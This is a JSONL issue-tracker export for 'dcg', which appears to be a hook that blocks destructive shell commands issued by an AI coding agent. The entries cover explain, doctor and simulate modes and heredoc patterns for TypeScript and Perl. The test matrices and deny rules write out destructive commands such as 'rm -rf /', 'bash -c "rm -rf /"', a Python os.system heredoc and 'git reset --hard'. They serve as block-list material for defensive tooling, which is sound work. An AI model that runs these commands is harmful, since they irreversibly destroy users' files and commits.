\"keywords_found\": [\"git\"],\n      \"result\": \"continue\"\n    },\n    \"normalization\": {\n      \"original\": \"git reset --hard HEAD~5\",\n      \"normalized\": \"git reset --hard HEAD~5\"\n    },\n    \"context_classification\": {\n      \"spans\": [\n        {\"range\": [0, 25], \"kind\": \"executed\"}\n      ]\n    },\n    \"heredoc_detection\": {\n      \"tier1_triggered\": false\n    },\n    \"pack_evaluation\": {\n      \"enabled_packs\": [\"core.git\", \"core.filesystem\"],\n      \"matches\": [\n        {\n          \"pack_id\": \"core.git\",\n          \"pattern_name\": \"reset-hard\",\n          \"pattern\": \"git reset --hard\",\n          \"reason\": \"Hard reset can permanently lose commits\"\n        }\n      ]\n    }\n  },\n  \"decision\": \"deny\",\n  \"rule_id\": \"core.git:reset-hard\",\n  \"reason\": \"Hard reset can permanently lose commits\",\n  \"suggestions\": [\n    {\n      \"kind\": \"preview_first\",\n      \"text\": \"Run `git diff` first to see what would be lost\"\n    }\n  ]\n}\n```\n\n## Compact Output Format\n\n```\nDENY core.git:reset-hard \"git reset --hard HEAD~5\" -\u003e Hard reset can permanently lose commits\n```\n\n## Implementation Notes\n\n- Reuse the shared evaluator from 99e.3.1\n- Add tracing/instrumentation hooks to capture each step\n- Store trace in a `DecisionTrace` struct as evaluation proceeds\n- Format the trace based on `--format` flag\n\n## Performance\n\nExplain mode is NOT on the hot path (user explicitly requests it), so:\n- Can be slower than normal evaluation\n- Can allocate for trace storage\n- Should still complete in \u003c100ms for typical commands\n\n## Acceptance Criteria\n\n- `dcg explain` works for all command types (simple, heredoc, pipes)\n- Pretty format is human-readable and helps users understand decisions\n- JSON format is valid and parseable by external tools\n- Compact format is suitable for logging/scripting\n- Suggestions are included in the output","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T21:23:51.003342694-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:55:30.329440887-05:00","closed_at":"2026-01-07T21:55:30.329440887-05:00","close_reason":"Duplicate of git_safety_guard-1gt.1 + subtasks; superseded and split for better dependency tracking.","dependencies":[{"issue_id":"git_safety_guard-1gt.6","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T21:23:51.004688188-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.7","title":"Improve dcg doctor (installation + config + hook health)","description":"## Objective\n\nMake `dcg doctor` a *high-trust* diagnostic that rapidly answers:\n\n- \"Is dcg installed correctly and on PATH?\"\n- \"Is the Claude Code hook registered correctly (exact matcher/command path)?\"\n- \"Is configuration loading what I think it is (and is it valid)?\"\n- \"If something is wrong, what exact command fixes it?\"\n\nThis is an adoption lever: a guard that is hard to diagnose gets disabled.\n\n## Current state (baseline)\n\n`dcg doctor` exists (see `src/cli.rs`) and already performs basic checks, but it does not yet validate many real-world failure modes:\n\n- wrong hook wiring (wrong tool matcher, wrong command, multiple hooks)\n- config parse errors / unknown pack IDs\n- cross-platform settings path nuances\n- \"it works in CLI but not in hook\" mismatch scenarios\n\n## Proposed doctor contract\n\n### Output\n\n- Human-readable by default.\n- Optional machine-readable mode (JSON) for CI/automation/support.\n\n### Checks (v1)\n\n1) **Binary presence + version**\n- Verify `dcg` resolves via PATH.\n- Print version + build metadata.\n\n2) **Claude Code settings discovery**\n- Locate settings file reliably across platforms.\n- If missing: warn-only (Claude Code may not be configured yet).\n\n3) **Hook registration validation**\n- Verify `hooks.PreToolUse` contains a `matcher: Bash` entry with a dcg hook.\n- Detect duplicates and ambiguous entries.\n- Validate that the configured hook command points to an executable (especially if absolute).\n\n4) **Config discovery + parse + validation**\n- Locate `~/.config/dcg/config.toml` (and any future supported locations).\n- If present, parse and validate:\n  - unknown pack IDs\n  - conflicting enable/disable\n  - overrides with invalid regex (once overrides are precompiled)\n\n5) **Self-check smoke test (optional)**\n- Prove the evaluator works end-to-end:\n  - allow case (e.g., `git status`)\n  - deny case (e.g., `git reset --hard`)\n\n### Fix mode (`--fix`)\n\n- Safe, explicit, non-destructive fixes only:\n  - install hook if missing\n  - create a sample config if missing (refuse to overwrite unless explicitly forced)\n- Never delete or overwrite user files.\n\n### Post-allowlist extension\n\nOnce allowlists ship, doctor should additionally validate allowlist presence/validity. This is tracked separately in `git_safety_guard-1gt.7.4` so the rest of doctor can ship earlier.\n\n## Acceptance criteria\n\n- Doctor catches and explains the top 5 real install/config/hook wiring failure modes.\n- `dcg doctor --fix` is idempotent and performs only safe changes.\n- Output is actionable (copy/paste next step).\n- Tests cover settings parsing + hook detection on representative fixtures.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T22:00:02.674578124-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:14:06.18244138-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.7","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T22:00:11.307939914-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.7.1","title":"Doctor: expand checks (settings, hook wiring, config validation)","description":"## Objective\n\nImplement the concrete `dcg doctor` checks described in `git_safety_guard-1gt.7`.\n\n## Detailed requirements\n\n### Hook wiring validation\n\n- Parse `~/.claude/settings.json` (or platform-specific equivalent) and verify:\n  - `hooks.PreToolUse` exists\n  - at least one entry with `matcher: \"Bash\"`\n  - within that entry, at least one hook with `type: \"command\"` and `command: \"dcg\"` (or an absolute path to dcg)\n- Detect and warn on:\n  - multiple dcg hooks (duplicate execution)\n  - hooks registered for the wrong matcher/tool\n  - hooks pointing to a missing executable\n\n### Config validation\n\n- Confirm which config file is in use.\n- If config exists, validate:\n  - TOML parses cleanly\n  - enabled/disabled pack sets are coherent\n  - pack IDs exist in the registry (unknown pack → warning/error)\n  - override regex compilation failures are surfaced clearly\n\n### Output\n\n- Each check prints a concise status line and, on failure, a short remediation.\n\n## Acceptance criteria\n\n- Doctor distinguishes between \"not installed\" vs \"installed but not hooked\" vs \"hooked but misconfigured\".\n- Error messages include exact next step commands.\n\n## Tests\n\n- Add fixture settings.json files that cover:\n  - missing hooks\n  - wrong matcher\n  - duplicate hooks\n  - absolute path hook\n- Unit tests validate detection logic against fixtures.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:00:29.816030738-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:00:29.816030738-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.7.1","depends_on_id":"git_safety_guard-1gt.7","type":"parent-child","created_at":"2026-01-07T22:00:39.518546237-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.7.2","title":"Doctor: safe fix mode (install hook + init config without overwrite)","description":"## Objective\n\nMake `dcg doctor --fix` actually useful while staying **non-destructive**.\n\n## Requirements\n\n### Safe fixes allowed\n\n- If hook is missing: run the same logic as `dcg install`.\n- If config is missing: create a sample config *only if the path does not exist*.\n\n### Explicitly forbidden\n\n- Overwriting or deleting any existing user file.\n- Making irreversible changes without explicit user confirmation.\n\n### UX\n\n- When `--fix` is supplied, doctor prints what it is about to do, then proceeds.\n- If a fix cannot be applied safely (e.g., file exists), print a clear instruction.\n\n## Acceptance criteria\n\n- Running `dcg doctor --fix` on a fresh machine registers the hook and creates config.\n- Running it on a configured machine makes no changes.\n- The command is idempotent.\n\n## Tests\n\n- Integration tests in a temp HOME directory:\n  - missing settings/config → fix creates them\n  - existing settings/config → fix does not overwrite\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:00:52.204950356-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:00:52.204950356-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.7.2","depends_on_id":"git_safety_guard-1gt.7","type":"parent-child","created_at":"2026-01-07T22:01:00.628177495-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.7.3","title":"Doctor: machine-readable output (--format json)","description":"## Objective\n\nAdd an optional JSON output mode for `dcg doctor` so automation and support workflows can consume diagnostics.\n\n## Requirements\n\n- CLI: `dcg doctor --format json` (or `--json`).\n- JSON includes:\n  - `schema_version`\n  - list of checks `{ id, status, message, remediation? }`\n  - detected paths (config path, settings path) with redaction as needed\n- Exit codes:\n  - 0: all good\n  - 1: issues found\n  - 2: fatal error (e.g., cannot read settings due to permissions)\n\n## Acceptance criteria\n\n- JSON schema is stable and snapshot-tested.\n- Human-readable output remains unchanged by default.\n\n## Notes\n\nThis is P3 because it is not required for core adoption, but it reduces friction for org-scale rollout.\n","notes":"## Review Additions (2026-01-08)\n\n### Determinism\n`dcg doctor --format json` must be deterministic so it can be used in scripts/CI:\n\n- stable key and list ordering\n- stable version/config paths\n- stable problem identifiers","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:01:14.265225432-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:29:25.066636446-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.7.3","depends_on_id":"git_safety_guard-1gt.7","type":"parent-child","created_at":"2026-01-07T22:01:23.311324539-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.7.4","title":"Doctor: allowlist discovery + validation checks","description":"## Objective\n\nExtend `dcg doctor` to validate allowlist installation and health once allowlists exist.\n\nThis is intentionally split out so the rest of `dcg doctor` can ship earlier.\n\n## Requirements\n\n- Detect user allowlist (`~/.config/dcg/allowlist.toml`) and project allowlist (`.dcg/allowlist.toml`).\n- For each allowlist found:\n  - validate schema version\n  - validate required fields (`rule`, `reason`, etc.)\n  - detect expired entries and surface as warnings\n  - detect unsafe wildcard entries and surface as warnings/errors per allowlist safety rules\n\n## Output UX\n\n- In human-readable mode, print a clear status line per layer:\n  - `User allowlist: OK` / `MISSING` / `INVALID` + 1-line remediation\n  - `Project allowlist: OK` / ...\n\n## Acceptance criteria\n\n- Doctor reports allowlist problems without crashing.\n- Doctor guides users to:\n  - `dcg allowlist validate --project|--user`\n  - `dcg allowlist add ...`\n\n## Tests\n\n- Fixture allowlist files for:\n  - valid entry\n  - invalid schema\n  - expired entry\n  - unsafe wildcard missing `risk_ack`\n- Unit tests assert doctor classification matches fixtures.\n\n## Dependencies\n\n- `git_safety_guard-1gt.2` (allowlists) must exist first.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:13:25.667664777-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:13:25.667664777-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.7.4","depends_on_id":"git_safety_guard-1gt.7","type":"parent-child","created_at":"2026-01-07T22:13:35.204041564-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.7.4","depends_on_id":"git_safety_guard-1gt.2","type":"blocks","created_at":"2026-01-07T22:13:40.356612088-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.7.5","title":"Doctor: detect observe-mode expiry and recommend tightening","description":"## Objective\n\nPrevent a common rollout failure mode: users enable warn-first observe mode and forget to tighten.\n\n`dcg doctor` should detect when observe mode is enabled (and/or expired) and provide clear guidance.\n\n## Requirements\n\n- If `policy.default_mode` is warn/log-only globally, doctor prints:\n  - current mode\n  - whether an `observe_until` is set\n  - whether it is expired\n\n- If expired:\n  - doctor warns prominently\n  - prints a suggested config change to tighten (or remove observe)\n\n## Acceptance criteria\n\n- Doctor output makes it obvious when the guard is not enforcing.\n\n## Dependencies\n\n- `git_safety_guard-1gt.3.3` (observe mode config)\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:18:00.275844431-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:18:00.275844431-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.7.5","depends_on_id":"git_safety_guard-1gt.7","type":"parent-child","created_at":"2026-01-07T22:18:10.822182359-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.7.5","depends_on_id":"git_safety_guard-1gt.3.3","type":"blocks","created_at":"2026-01-07T22:18:15.86285868-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.8","title":"Add dcg simulate (replay command logs for safe rollout + tuning)","description":"## Objective\n\nAdd a *simulation/replay* CLI mode so users can evaluate DCG policy on historical command streams **before** enforcing it.\n\nThis directly supports two real-world adoption problems:\n\n1) Teams want to roll out in warn-only / observe mode first.\n2) False positives are easier to eliminate when we can analyze a corpus offline.\n\n## Key user stories\n\n- \"Before I enable strict packs, show me what would be blocked on my last 7 days of shell history.\"\n- \"Run on CI logs and summarize which rules would have fired most often.\"\n- \"Generate an allowlist skeleton for the highest-frequency false positives (with guardrails).\"\n\n## Proposed CLI\n\n- `dcg simulate --file \u003cpath\u003e [--format pretty|json] [--limit N] [--since ...]`\n- Input auto-detect (per-line):\n  - plain command string\n  - hook JSON (`{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"...\"}}`)\n  - structured decision log entries (once `git_safety_guard-1gt.4` exists)\n\n## Output (pretty)\n\n- Summary counts: allow / warn / deny\n- Top N rules (rule_id) by frequency\n- Top files/contexts (if present in input)\n- Optional: suggested next actions (enable pack, add allowlist, run explain)\n\n## Output (json)\n\n- Stable schema with:\n  - totals\n  - per-rule counts\n  - per-pack counts\n  - sample exemplars per rule (redacted/truncated)\n\n## Safety / privacy\n\n- Never print full commands by default in summaries; use truncation.\n- Optional `--redact` consistent with scan/explain.\n\n## Acceptance criteria\n\n- Simulation can process large logs without panicking.\n- Results are deterministic.\n- Users can identify the top false-positive offenders quickly.\n\n## Dependencies\n\n- `git_safety_guard-99e.3.1` shared evaluator (single source of truth)\n- `git_safety_guard-99e.2` stable rule ids\n- (optional) `git_safety_guard-1gt.4` structured log schema for one input mode\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- `git_safety_guard-1gt.8.4` should cover integration tests with:\n  - streamed JSON log parsing\n  - deterministic aggregation output\n  - redaction/truncation\n- Include at least one fixture demonstrating false-positive tuning (many warns, few errors).","status":"open","priority":3,"issue_type":"feature","created_at":"2026-01-07T22:14:39.174102664-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:29:36.630036328-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.8","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T22:14:49.475594368-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.8","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T22:14:54.661067027-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.8","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T22:14:59.818843266-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.8.1","title":"Simulate: input formats + streaming parser","description":"## Objective\n\nImplement robust parsing for `dcg simulate` inputs with conservative auto-detection.\n\n## Supported input line formats\n\n1) **Plain command**\n- The entire line is the command string.\n\n2) **Hook JSON**\n- `{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"...\"}}`\n- Ignore non-Bash tool events (treat as allow).\n\n3) **Structured decision log entries** (post `git_safety_guard-1gt.4`)\n- Parse log schema version and extract the command.\n\n## Requirements\n\n- Streaming: process the file line-by-line (avoid loading entire file).\n- Limits:\n  - `--max-lines`\n  - `--max-bytes`\n  - `--max-command-bytes`\n- Error handling:\n  - malformed lines are counted and reported, but do not abort (unless `--strict`).\n\n## Acceptance criteria\n\n- Parser never panics on arbitrary input lines.\n- Auto-detection is deterministic (same line → same format classification).\n\n## Tests\n\n- Unit tests with fixture lines for each format.\n- Fuzz target may be added later via `git_safety_guard-7tg.2`.\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:15:17.697073762-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:15:17.697073762-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.8.1","depends_on_id":"git_safety_guard-1gt.8","type":"parent-child","created_at":"2026-01-07T22:15:28.516366171-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.8.2","title":"Simulate: evaluation loop + aggregation (counts, top rules)","description":"## Objective\n\nImplement the core simulation loop that:\n\n- evaluates each parsed command with the shared evaluator\n- aggregates results into actionable summaries\n\n## Aggregations (v1)\n\n- totals: allow / warn / deny\n- per-rule counts (`rule_id`)\n- per-pack counts (`pack_id`)\n- exemplar sampling per rule (keep top K shortest / first K occurrences)\n\n## Determinism\n\n- Sorting of summary outputs must be deterministic (count desc then rule_id asc).\n- Sampling must be deterministic (first K occurrences by file order).\n\n## Acceptance criteria\n\n- `dcg simulate` produces stable output given the same input file.\n- Aggregation respects limits (`--limit`, `--top N`, etc.).\n\n## Dependencies\n\n- `git_safety_guard-1gt.8.1` (parser)\n- `git_safety_guard-99e.3.1` (shared evaluator)\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Aggregation output must be deterministic:\n  - stable sorting for “top rules” and “top packs”\n  - stable bucketing for allow/warn/deny\n- Unit tests should assert stable ordering and correct counts.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:15:42.58033159-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:29:46.96506937-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.8.2","depends_on_id":"git_safety_guard-1gt.8","type":"parent-child","created_at":"2026-01-07T22:15:52.76100775-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.8.2","depends_on_id":"git_safety_guard-1gt.8.1","type":"blocks","created_at":"2026-01-07T22:15:57.931365713-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.8.3","title":"Simulate: output formats (pretty/json) + redaction/truncation","description":"## Objective\n\nImplement `dcg simulate` output formatting in both human and machine forms.\n\n## Pretty output requirements\n\n- Summary header (totals + elapsed time)\n- Top rules table:\n  - rule_id\n  - count\n  - decision (deny/warn)\n  - 1-line reason (if available)\n- Optional section: sample commands per top rule (truncated + redacted)\n\n## JSON output requirements\n\n- `schema_version`\n- totals\n- `rules[]`: `{ rule_id, pack_id, decision, count, reason?, examples[] }`\n- `errors[]`: parse errors counts, malformed lines count\n\n## Privacy\n\n- Default to truncation in examples.\n- Support `--redact` consistent with scan/explain.\n\n## Acceptance criteria\n\n- Output is stable for golden tests.\n- JSON output is valid and additive-only for schema v1.\n\n## Dependencies\n\n- `git_safety_guard-1gt.8.2` (aggregation)\n","notes":"## Review Additions (2026-01-08)\n\n### Determinism\n- Output formats must be deterministic and stable for diffing:\n  - stable JSON schema versioning\n  - stable sorting of aggregated tables\n  - stable truncation/redaction rules","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:16:19.160687587-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:30:01.561272192-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.8.3","depends_on_id":"git_safety_guard-1gt.8","type":"parent-child","created_at":"2026-01-07T22:16:29.475130683-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.8.3","depends_on_id":"git_safety_guard-1gt.8.2","type":"blocks","created_at":"2026-01-07T22:16:34.556618726-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.8.4","title":"Simulate: fixtures + integration tests + detailed logging","description":"## Objective\n\nAdd tests that make `dcg simulate` trustworthy and easy to evolve.\n\n## Test strategy\n\n### Unit tests\n\n- parser unit tests (format detection) live with `git_safety_guard-1gt.8.1`.\n\n### Integration tests (this task)\n\n- Run the compiled binary with `dcg simulate` against fixture log files.\n- Assert:\n  - exit codes\n  - key summary counts\n  - top rule ordering stability\n  - redaction/truncation behavior\n\n## Logging requirements\n\nTest failures should print:\n\n- which fixture file\n- which line number caused parse failure\n- the offending line (truncated)\n- the expected vs actual summary\n\n## Acceptance criteria\n\n- Tests are deterministic across runs.\n- Adding a new fixture regression is easy.\n\n## Dependencies\n\n- `git_safety_guard-1gt.8.3` (output)\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:16:52.270612219-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:16:52.270612219-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.8.4","depends_on_id":"git_safety_guard-1gt.8","type":"parent-child","created_at":"2026-01-07T22:17:02.125735949-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.8.4","depends_on_id":"git_safety_guard-1gt.8.3","type":"blocks","created_at":"2026-01-07T22:17:07.167409749-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-26f","title":"Define TypeScript destructive patterns for heredoc scanning","description":"## Objective\n\nDefine TypeScript heredoc patterns with a focus on **runtime destructive operations**, while avoiding low-signal “TypeScript style” heuristics that would create false positives.\n\n## Scope boundary\n\nTypeScript compiles to JavaScript; destructive operations are the same at runtime.\n\nTherefore:\n\n- Reuse the JavaScript/Node pattern families from `git_safety_guard-mcf`.\n- Add only TypeScript-syntax coverage (types, generics, decorators) so the parser can still match the same runtime calls.\n\n## Pattern families (v1)\n\n- Recursive filesystem deletion:\n  - `fs.rmSync(..., { recursive: true })`\n  - `fs.rmdirSync(..., { recursive: true })`\n- Process execution with destructive payload:\n  - `child_process.execSync(\"rm -rf ...\")`\n  - `spawnSync(\"rm\", [\"-rf\", ...])`\n\n## Explicitly out of scope (avoid FPs)\n\n- Heuristics like “@ts-ignore preceding dangerous code”\n- “any type casts” / “type assertions” as signals\n\nThese are too common and do not map directly to destructive operations.\n\n## Acceptance Criteria\n\n- TS patterns are a superset of JS patterns in terms of runtime destructive operations, differing only in syntax support.\n- Includes positive + negative fixtures that exercise TS syntax (types/generics/decorators) without changing runtime behavior.\n- No default hard denies unless the matched operation is clearly catastrophic.\n","notes":"Taking this next to unblock git_safety_guard-e7m: expand TypeScript heredoc patterns (mirror JS families) + add TS-syntax-focused fixtures; reuse/refine catastrophic-path and destructive-literal payload detection; run full gates + push.","status":"closed","priority":2,"issue_type":"task","assignee":"CrimsonFalcon","created_at":"2026-01-07T18:37:17.541114003-05:00","created_by":"ubuntu","updated_at":"2026-01-08T06:09:08.474522952-05:00","closed_at":"2026-01-08T06:09:08.474522952-05:00","close_reason":"Expanded TypeScript heredoc patterns to mirror JS families (fs rm/rmdir + execSync/spawnSync + Deno.remove), with refinement to block only on catastrophic literal paths and destructive literal shell payloads. Added ≥5 positive + ≥5 negative TS fixtures covering TS syntax (type assertions, generics, decorators). Full fmt/check/clippy/test + e2e pass.","dependencies":[{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:34.25492655-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:34.273731104-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-mcf","type":"blocks","created_at":"2026-01-07T18:37:34.292923988-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-26f","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:44.680006442-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2cu","title":"Design false positive reduction strategy for string arguments","description":"## Objective\n\nDesign and implement strategies to dramatically reduce false positives in command blocking, especially for documentation and string arguments.\n\n## The Core Problem\n\nThe current regex-based guard suffers from context blindness. It sees:\n```\nbd create --description=\"Pattern blocks rm -rf commands\"\n```\n\nAnd matches \"rm -rf\" without understanding it's:\n1. Inside a quoted string\n2. An argument to a documentation tool\n3. NOT actually being executed\n\nThis creates severe workflow disruption when trying to document the very patterns we're blocking.\n\n## Why This Is Critical\n\nFalse positives are arguably WORSE than false negatives:\n- False negative: A dangerous command might slip through (rare, recoverable with backups)\n- False positive: Blocks legitimate work, forces workarounds, erodes trust in the tool\n- Repeated false positives lead users to disable the guard entirely\n\nThe guard must be TRUSTED to make intelligent decisions, not blindly pattern-match text.\n\n## Solution Approaches\n\n### 1. Command Structure Analysis (Primary Approach)\n\nParse the top-level command with a lightweight shell/token model to understand structure:\n- Identify command name (bd, git, echo, etc.)\n- Identify argument positions (which are options vs values)\n- Identify quoting context (single, double, unquoted)\n- Only apply destructive patterns to EXECUTABLE positions\n\nExample analysis:\n```\nbd create --title=\"...\" --description=\"rm -rf pattern docs\"\n         ^command       ^option         ^string value (NOT executed)\n```\n\n### 2. Safe Command Registry\n\nMaintain a list of commands that take non-executable string arguments:\n- bd create, bd update (--description, --title)\n- git commit (-m), git tag (-m)\n- echo, printf (arguments are printed, not executed)\n- grep, rg (pattern arguments)\n\nFor these commands, don't apply destructive patterns to their string arguments.\n\n### 3. Execution Context Detection\n\nDistinguish between:\n- **Direct execution**: The string IS the command (`bash dangerous_cmd`)\n- **String literal**: The string is DATA passed to a command (`bd --desc=\"...\"`)\n- **Heredoc body**: Requires language-specific analysis (the whole point of ast-grep)\n\n### 4. Two-Phase Analysis\n\n1. **Quick structural check**: parse command structure, identify context\n2. **Pattern matching**: only apply patterns to executable contexts\n3. **Deep analysis**: for heredocs/complex cases, use ast-grep / language-aware scanning\n\n### 5. Confidence Scoring (optional later)\n\nInstead of binary block/allow:\n- High confidence dangerous: block immediately\n- Medium confidence: more thorough analysis\n- Low confidence (looks like documentation): allow with optional warning\n\n## Implementation Strategy\n\n1. Choose the minimal parsing substrate that meets performance needs:\n   - tokenization + quoting + operator detection (pipes/subst)\n   - optionally tree-sitter-bash if needed for correctness\n2. Define `ExecutionContext` enum: Direct, StringArg, Heredoc, PipeTarget, CommandSubst\n3. Maintain a Safe String-Argument Registry (command + flags) and apply it only in `StringArg` context.\n4. Ensure ambiguity defaults to safe behavior (do not “trust” unknown flags as safe).\n\n## Test Cases\n\nEssential false positive tests:\n- `bd create --description=\"This blocks rm -rf\"` → ALLOW\n- `git commit -m \"Fix rm -rf pattern matching\"` → ALLOW\n- `echo \"example: git reset --hard\"` → ALLOW\n- `grep \"rm -rf\" patterns.txt` → ALLOW\n\nEssential true positive tests (should still block):\n- `rm -rf /tmp/*` → BLOCK\n- `bash -c \"rm -rf /\"` → BLOCK\n- `python3 \u003c\u003c 'EOF'\n  import os; os.system(\"rm -rf /\")\n  EOF` → BLOCK (via heredoc analysis)\n\n## Acceptance Criteria\n\n- Design is captured in a self-contained doc/ADR-like section (does not require reading external plan docs).\n- Defines:\n  - the execution-context model\n  - the initial Safe String-Argument Registry scope\n  - conservative default rules for ambiguity\n- Provides a concrete test matrix of:\n  - must-allow doc/test cases\n  - must-block executed cases\n- Specifies a performance budget for the parsing/classification layer (initial target: sub-5ms worst-case, revise after baseline).\n","notes":"Design document complete: docs/design-2cu-false-positive-reduction.md - Formalizes execution context model, SafeStringRegistry scope, test matrix, performance budget. Key finding: context.rs implementation is solid, needs evaluator integration.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:36:56.104462373-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:43:55.48241764-05:00","closed_at":"2026-01-08T01:43:55.48241764-05:00","close_reason":"Design complete. Document at docs/design-2cu-false-positive-reduction.md covers execution context model, SafeStringRegistry scope, test matrix, performance budget. Key finding: context.rs already has solid implementation, needs evaluator.rs integration.","dependencies":[{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:37:02.996636534-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:37:03.01736459-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2cu","depends_on_id":"git_safety_guard-t8x","type":"parent-child","created_at":"2026-01-07T20:02:17.777570479-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-2d4","title":"Define Perl destructive patterns for heredoc scanning","description":"## Objective\n\nDefine Perl heredoc matchers that detect **high-signal destructive operations** while minimizing false positives.\n\n## Scope boundary\n\n- Focus on irreversible filesystem/process operations.\n- Avoid broad “Perl is scary” patterns (eval/regex/taint/network) as default denies; they are not directly destructive and will produce noise.\n\n## Pattern families (v1)\n\n### 1) Process execution with destructive payload\n\n- `system(\"rm -rf ...\")` (literal)\n- backticks / `qx//` containing literal destructive payload\n- `exec(\"git reset --hard ...\")` (literal)\n\n### 2) Recursive deletion / filesystem destructive ops\n\n- `File::Path::rmtree($path)` (literal catastrophic target → Error; otherwise Warning)\n- `unlink($path)` / `rmdir($path)` (Warning by default unless catastrophic target)\n\n## False positive mitigation\n\n- Do not flag `system($VAR)` as deny.\n- Do not flag module imports alone.\n- Require negative fixtures that include documentation strings and harmless cleanup.\n\n## Acceptance Criteria\n\n- Defines a Perl pattern set aligned with severity taxonomy and focused on destructive outcomes.\n- Includes at least 5 positive and 5 negative fixtures.\n- No default hard denies unless the matched operation is clearly catastrophic.\n","notes":"CrimsonFalcon: implementing Perl heredoc matcher fallback (regex/heuristic) + unit tests; will run full quality gates and push.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:19.324205765-05:00","created_by":"ubuntu","updated_at":"2026-01-08T05:27:04.470945278-05:00","closed_at":"2026-01-08T05:27:04.470945278-05:00","close_reason":"Implemented Perl regex fallback matcher + unit fixtures; fixed normalization idempotency regression uncovered by proptest","dependencies":[{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:37.366046506-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:37.385299864-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-2d4","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:49.808754149-05:00","created_by":"ubuntu"}]}
